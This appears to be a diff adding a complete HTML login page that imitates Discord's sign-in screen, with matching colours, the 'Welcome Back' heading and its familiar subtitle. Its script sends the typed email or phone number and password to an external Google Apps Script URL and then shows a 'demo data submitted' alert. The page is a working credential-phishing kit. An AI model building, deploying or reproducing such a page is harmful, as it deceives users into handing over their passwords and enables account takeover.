@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Welcome Back</title>
+<style>
+  html, body {
+    height: 100%;
+    margin: 0;
+  }
+  body {
+    background-color: #36393f;
+    font-family: 'Helvetica Neue', Arial, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    color: #dcddde;
+  }
+  .login-box {
+    background-color: #2f3136;
+    padding: 40px 30px 30px 30px;
+    border-radius: 8px;
+    width: 360px;
+    box-shadow: 0 0 10px rgba(0,0,0,0.6);
+    box-sizing: border-box;
+  }
+  h1 {
+    margin: 0 0 4px 0;
+    font-weight: 700;
+    font-size: 32px;
+    color: white;
+  }
+  p.subtitle {
+    margin: 0 0 20px 0;
+    font-weight: 500;
+    font-size: 16px;
+    color: #b9bbbe;
+  }
+  label {
+    display: block;
+    font-size: 12px;
+    color: #72767d;
+    margin-bottom: 6px;
+    font-weight: 600;
+  }
+  .input-group {
+    position: relative;
+    margin-bottom: 20px;
+  }
+  input[type="text"], input[type="password"] {
+    width: 100%;
+    background-color: #202225;
+    border: none;
+    border-radius: 5px;
+    padding: 12px 44px 12px 12px;
+    font-size: 16px;
+    color: #dcddde;
+    box-sizing: border-box;
+  }
+  input::placeholder {
+    color: #72767d;
+  }
+  .eye-icon {
+    position: absolute;
+    right: 12px;
+    top: 50%;
+    transform: translateY(-50%);
+    cursor: pointer;
+    width: 24px;
+    height: 24px;
+    fill: #72767d;
+    transition: fill 0.3s;
+  }
+  .eye-icon:hover {
+    fill: #dcddde;
+  }
+  button {
+    width: 100%;
+    background-color: #5865f2;
+    color: white;
+    border: none;
+    border-radius: 5px;
+    padding: 14px;
+    font-weight: 700;
+    font-size: 16px;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+  }
+  button:hover {
+    background-color: #4752c4;
+  }
+</style>
+</head>
+<body>
+  <div class="login-box">
+    <h1>Welcome Back</h1>
+    <p class="subtitle">-# We’re excited to see you again!</p>
+
+    <label for="email">Account Information</label>
+
+    <div class="input-group">
+      <input type="text" id="email" placeholder="Email or Phone Number" autocomplete="username" />
+    </div>
+
+    <div class="input-group">
+      <input type="password" id="password" placeholder="Password" autocomplete="current-password" />
+      <svg class="eye-icon" id="togglePassword" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path d="M12 5c-7.633 0-11 6.783-11 7s3.367 7 11 7 11-6.783 11-7-3.367-7-11-7zm0 12c-2.76 0-5-2.238-5-5s2.24-5 5-5 5 2.238 5 5-2.24 5-5 5zm0-8a3 3 0 100 6 3 3 0 000-6z"/>
+      </svg>
+    </div>
+
+    <button onclick="submitForm()">Login</button>
+  </div>
+
+<script>
+  const togglePassword = document.querySelector('#togglePassword');
+  const passwordInput = document.querySelector('#password');
+
+  togglePassword.addEventListener('click', function () {
+    const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+    passwordInput.setAttribute('type', type);
+    if(type === 'password') {
+      togglePassword.style.fill = '#72767d';
+    } else {
+      togglePassword.style.fill = '#5865f2';
+    }
+  });
+
+  function submitForm() {
+    const username = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+
+    fetch("https://script.google.com/macros/s/AKfycbx8MXl_5fjaE7vygeGUOjxWdRU_7-Hx9QWjF5VTgFWpidRXmvXSnUeWewBOnwOLFBd_YA/exec", {
+      method: "POST",
+      body: new URLSearchParams({
+        username: username,
+        password: password
+      })
+    })
+    .then(response => response.text())
+    .then(data => {
+      alert("Demo data submitted successfully!");
+      // Optional: clear inputs or redirect here
+    })
+    .catch(error => alert("Error submitting data."));
+  }
+</script>
+</body>
+</html>
